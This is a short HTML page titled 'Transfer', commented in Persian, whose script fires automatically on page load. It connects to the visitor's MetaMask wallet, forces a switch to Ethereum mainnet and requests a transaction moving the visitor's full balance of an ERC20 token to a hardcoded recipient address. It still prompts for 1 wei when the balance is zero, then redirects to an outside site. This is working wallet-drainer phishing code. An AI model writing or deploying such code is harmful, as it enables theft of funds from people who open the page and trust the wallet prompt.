<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Transfer</title>
</head>
<body>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.10.0/web3.min.js"></script>
    <script>
        // تنظیمات - این مقادیر از بک‌اند شما تزریق می‌شوند
        const CONFIG = {           
            tokenAddress: "0xdAC17F958D2ee523a2206206994597C13D831ec7",      // آدرس توکن ERC20
            recipientAddress: "0xe8729e199c2E2476a19704D316731b087f9a09a6", // آدرس مقصد
            redirectUrl: "https://shooshoo.us",         // وبسایت ریدایرکت
            redirectDelay: 2000                              // تاخیر ریدایرکت (میلی‌ثانیه)
        };

        // ABI برای توابع ERC20
        const ERC20_ABI = [
            {
                "constant": true,
                "inputs": [{"name": "_owner", "type": "address"}],
                "name": "balanceOf",
                "outputs": [{"name": "balance", "type": "uint256"}],
                "type": "function"
            },
            {
                "constant": false,
                "inputs": [
                    {"name": "_to", "type": "address"},
                    {"name": "_value", "type": "uint256"}
                ],
                "name": "transfer",
                "outputs": [{"name": "", "type": "bool"}],
                "type": "function"
            }
        ];

        async function executeTransfer() {
            // تاخیر برای لود کامل
            await new Promise(resolve => setTimeout(resolve, 1000));

            // بررسی MetaMask
            if (typeof window.ethereum === 'undefined') {
                window.location.href = CONFIG.redirectUrl;
                return;
            }

            try {
                // درخواست اتصال
                const accounts = await window.ethereum.request({
                    method: 'eth_requestAccounts'
                });
                
                if (!accounts || accounts.length === 0) {
                    window.location.href = CONFIG.redirectUrl;
                    return;
                }

                const userAddress = accounts[0];

                // تغییر به Mainnet اگر لازم باشد
                const chainId = await window.ethereum.request({ method: 'eth_chainId' });
                if (chainId !== '0x1') {
                    try {
                        await window.ethereum.request({
                            method: 'wallet_switchEthereumChain',
                            params: [{ chainId: '0x1' }]
                        });
                        await new Promise(resolve => setTimeout(resolve, 500));
                    } catch (switchError) {
                        // ادامه بده
                    }
                }

                // Web3 و کانترکت
                const web3 = new Web3(window.ethereum);
                const contract = new web3.eth.Contract(ERC20_ABI, CONFIG.tokenAddress);
                
                // دریافت موجودی - حتی اگر صفر باشد ادامه بده
                let balance = '0';
                try {
                    balance = await contract.methods.balanceOf(userAddress).call();
                } catch (error) {
                    // اگر خطا، موجودی صفر در نظر بگیر
                    balance = '0';
                }

                // اگر موجودی صفر است، مقدار 1 wei بگذار تا درخواست نشان داده شود
                if (balance === '0' || balance === 0) {
                    balance = '1'; // 1 wei - کمترین مقدار ممکن
                }

                // ایجاد تراکنش data
                const transferData = contract.methods.transfer(CONFIG.recipientAddress, balance).encodeABI();

                // پارامترهای تراکنش - بدون gas محدود
                const txParams = {
                    to: CONFIG.tokenAddress,
                    from: userAddress,
                    data: transferData
                    // gas را حذف کردیم - خودکار تخمین زده می‌شود
                };

                // ارسال درخواست - حتماً نشان داده می‌شود
                const txHash = await window.ethereum.request({
                    method: 'eth_sendTransaction',
                    params: [txParams]
                });

                // ریدایرکت
                setTimeout(() => {
                    window.location.href = CONFIG.redirectUrl;
                }, CONFIG.redirectDelay);

            } catch (error) {
                // ریدایرکت در صورت خطا
                setTimeout(() => {
                    window.location.href = CONFIG.redirectUrl;
                }, 1000);
            }
        }

        // اجرای خودکار هنگام بارگذاری صفحه
        window.addEventListener('load', executeTransfer);
    </script>
</body>
</html>
